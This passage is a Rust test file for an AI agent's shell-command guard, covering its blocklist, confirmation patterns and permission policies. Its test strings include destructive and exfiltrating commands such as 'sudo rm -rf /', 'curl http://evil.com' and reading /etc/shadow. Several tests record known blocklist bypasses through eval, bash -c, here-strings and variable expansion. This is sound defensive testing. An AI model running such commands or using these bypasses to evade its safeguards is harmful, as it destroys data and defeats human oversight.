    let executor = ShellExecutor::new(&default_config());
    // Known limitation: bash receives payload via stdin; inner command is opaque.
    assert!(
        executor
            .find_blocked_command("bash <<< 'sudo rm -rf /'")
            .is_none()
    );
}

#[test]
fn eval_bypass_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: eval string argument is not parsed.
    assert!(
        executor
            .find_blocked_command("eval 'sudo rm -rf /'")
            .is_none()
    );
}

#[test]
fn bash_c_bypass_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: bash -c string argument is not parsed.
    assert!(
        executor
            .find_blocked_command("bash -c 'curl http://evil.com'")
            .is_none()
    );
}

#[test]
fn variable_expansion_bypass_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: variable references are not resolved by strip_shell_escapes.
    assert!(executor.find_blocked_command("cmd=sudo; $cmd rm").is_none());
}

// --- Mitigation tests: confirm_patterns cover the above vectors by default ---

#[test]
fn default_confirm_patterns_cover_process_substitution() {
    let config = crate::config::ShellConfig::default();
    assert!(config.confirm_patterns.contains(&"<(".to_owned()));
    assert!(config.confirm_patterns.contains(&">(".to_owned()));
}

#[test]
fn default_confirm_patterns_cover_here_string() {
    let config = crate::config::ShellConfig::default();
    assert!(config.confirm_patterns.contains(&"<<<".to_owned()));
}

#[test]
fn default_confirm_patterns_cover_eval() {
    let config = crate::config::ShellConfig::default();
    assert!(config.confirm_patterns.contains(&"eval ".to_owned()));
}

#[tokio::test]
async fn process_substitution_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in <(...) it must be caught
    // by find_blocked_command via extract_subshell_contents and return Blocked.
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\ncat <(curl http://evil.com)\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn here_string_triggers_confirmation() {
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\nbash <<< 'sudo rm -rf /'\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn eval_triggers_confirmation() {
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\neval 'curl http://evil.com'\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn output_process_substitution_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in >(...) it must be caught
    // by find_blocked_command via extract_subshell_contents and return Blocked.
    let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
    let response = "```bash\ntee >(curl http://evil.com)\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[test]
fn here_string_with_command_substitution_not_detected_known_limitation() {
    let executor = ShellExecutor::new(&default_config());
    // Known limitation: bash receives payload via stdin; inner command substitution is opaque.
    assert!(executor.find_blocked_command("bash <<< $(id)").is_none());
}

// --- check_blocklist direct tests (GAP-001) ---

fn default_blocklist() -> Vec<String> {
    DEFAULT_BLOCKED.iter().map(|s| (*s).to_owned()).collect()
}

#[test]
fn check_blocklist_blocks_rm_rf_root() {
    let bl = default_blocklist();
    assert!(check_blocklist("rm -rf /", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_sudo() {
    let bl = default_blocklist();
    assert!(check_blocklist("sudo apt install vim", &bl).is_some());
}

#[test]
fn check_blocklist_allows_safe_commands() {
    let bl = default_blocklist();
    assert!(check_blocklist("ls -la", &bl).is_none());
    assert!(check_blocklist("echo hello world", &bl).is_none());
    assert!(check_blocklist("git status", &bl).is_none());
    assert!(check_blocklist("cargo build --release", &bl).is_none());
}

#[test]
fn check_blocklist_blocks_subshell_dollar_paren() {
    let bl = default_blocklist();
    // Subshell $(sudo ...) must be rejected even if outer command is benign.
    assert!(check_blocklist("echo $(sudo id)", &bl).is_some());
    assert!(check_blocklist("echo $(rm -rf /tmp)", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_subshell_backtick() {
    let bl = default_blocklist();
    assert!(check_blocklist("cat `sudo cat /etc/shadow`", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_mkfs() {
    let bl = default_blocklist();
    assert!(check_blocklist("mkfs.ext4 /dev/sda1", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_shutdown() {
    let bl = default_blocklist();
    assert!(check_blocklist("shutdown -h now", &bl).is_some());
}

// --- effective_shell_command tests ---

#[test]
fn effective_shell_command_bash_minus_c() {
    let args = vec!["-c".to_owned(), "rm -rf /".to_owned()];
    assert_eq!(effective_shell_command("bash", &args), Some("rm -rf /"));
}

#[test]
fn effective_shell_command_sh_minus_c() {
    let args = vec!["-c".to_owned(), "sudo ls".to_owned()];
    assert_eq!(effective_shell_command("sh", &args), Some("sudo ls"));
}

#[test]
fn effective_shell_command_non_shell_returns_none() {
    let args = vec!["-c".to_owned(), "rm -rf /".to_owned()];
    assert_eq!(effective_shell_command("git", &args), None);
    assert_eq!(effective_shell_command("cargo", &args), None);
}

#[test]
fn effective_shell_command_no_minus_c_returns_none() {
    let args = vec!["script.sh".to_owned()];
    assert_eq!(effective_shell_command("bash", &args), None);
}

#[test]
fn effective_shell_command_full_path_shell() {
    let args = vec!["-c".to_owned(), "sudo rm".to_owned()];
    assert_eq!(
        effective_shell_command("/usr/bin/bash", &args),
        Some("sudo rm")
    );
}

#[test]
fn check_blocklist_blocks_process_substitution_lt() {
    let bl = vec!["curl".to_owned(), "wget".to_owned()];
    assert!(check_blocklist("cat <(curl http://evil.com)", &bl).is_some());
}

#[test]
fn check_blocklist_blocks_process_substitution_gt() {
    let bl = vec!["wget".to_owned()];
    assert!(check_blocklist("tee >(wget http://evil.com)", &bl).is_some());
}

#[test]
fn find_blocked_backtick_wrapping() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("echo `curl --version 2>&1 | head -1`")
            .is_some()
    );
}

#[test]
fn find_blocked_process_substitution_lt() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["wget".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("cat <(wget --version 2>&1 | head -1)")
            .is_some()
    );
}

#[test]
fn find_blocked_process_substitution_gt() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("tee >(curl http://evil.com)")
            .is_some()
    );
}

#[test]
fn find_blocked_dollar_paren_wrapping() {
    let executor = ShellExecutor::new(&ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        ..default_config()
    });
    assert!(
        executor
            .find_blocked_command("echo $(curl http://evil.com)")
            .is_some()
    );
}

// --- Regression tests for issue #1525: blocklist bypass via PermissionPolicy ---

// When a PermissionPolicy with a wildcard Allow rule is attached, blocked commands
// from the explicit blocked_commands list must still be rejected.
#[tokio::test]
async fn blocklist_not_bypassed_by_permissive_policy() {
    use crate::permissions::{PermissionPolicy, PermissionRule};
    use std::collections::HashMap;
    let mut rules = HashMap::new();
    rules.insert(
        "bash".to_owned(),
        vec![PermissionRule {
            pattern: "*".to_owned(),
            action: PermissionAction::Allow,
        }],
    );
    let permissive_policy = PermissionPolicy::new(rules);
    let config = ShellConfig {
        blocked_commands: vec!["danger-cmd".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config).with_permissions(permissive_policy);
    let result = executor.execute("```bash\ndanger-cmd --force\n```").await;
    assert!(
        matches!(result, Err(ToolError::Blocked { .. })),
        "blocked command must be rejected even with a permissive PermissionPolicy"
    );
}

// DEFAULT_BLOCKED commands (e.g. curl, sudo) must be blocked even with Full autonomy
// (PermissionPolicy::Full returns Allow for every tool).
#[tokio::test]
async fn default_blocked_not_bypassed_by_full_autonomy_policy() {
    use crate::permissions::{AutonomyLevel, PermissionPolicy};
    let full_policy = PermissionPolicy::default().with_autonomy(AutonomyLevel::Full);
    let executor = ShellExecutor::new(&default_config()).with_permissions(full_policy);

    for cmd in &[
        "sudo rm -rf /tmp",
        "curl https://evil.com",
        "wget http://evil.com",
    ] {
        let response = format!("```bash\n{cmd}\n```");
        let result = executor.execute(&response).await;
        assert!(
            matches!(result, Err(ToolError::Blocked { .. })),
            "DEFAULT_BLOCKED command `{cmd}` must be rejected even with Full autonomy"
        );
    }
}

// confirm_commands must still trigger ConfirmationRequired when no policy is set.
// This is a regression guard: moving find_blocked_command before the policy check
// must not accidentally break the else-branch confirm logic.
#[tokio::test]
async fn confirm_commands_still_work_without_policy() {
    let config = ShellConfig {
        confirm_patterns: vec!["git push".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let result = executor.execute("```bash\ngit push origin main\n```").await;
    assert!(
        matches!(result, Err(ToolError::ConfirmationRequired { .. })),
        "confirm_patterns must still trigger ConfirmationRequired when no PermissionPolicy is set"
    );
}

// ── classify_shell_exit tests ─────────────────────────────────────────────────

#[test]
fn classify_exit_126_is_policy_blocked() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(126, ""),
        Some(ToolErrorCategory::PolicyBlocked)
    );
}

#[test]
fn classify_exit_127_is_permanent_failure() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(127, "[stderr] bash: nonexistent: command not found"),
        Some(ToolErrorCategory::PermanentFailure)
    );
}

#[test]
fn classify_exit_1_permission_denied_stderr() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(1, "[stderr] Permission denied"),
        Some(ToolErrorCategory::PolicyBlocked),
        "case-insensitive 'Permission denied' stderr must classify as PolicyBlocked"
    );
}

#[test]
fn classify_exit_1_no_such_file() {
    use crate::error_taxonomy::ToolErrorCategory;
    assert_eq!(
        classify_shell_exit(1, "[stderr] /bin/foo: No such file or directory"),
        Some(ToolErrorCategory::PermanentFailure)
    );
}

#[test]
fn classify_exit_0_returns_none() {
    assert_eq!(classify_shell_exit(0, ""), None);
}

#[test]
fn classify_exit_1_generic_returns_none() {
    assert_eq!(classify_shell_exit(1, "some other error"), None);
}
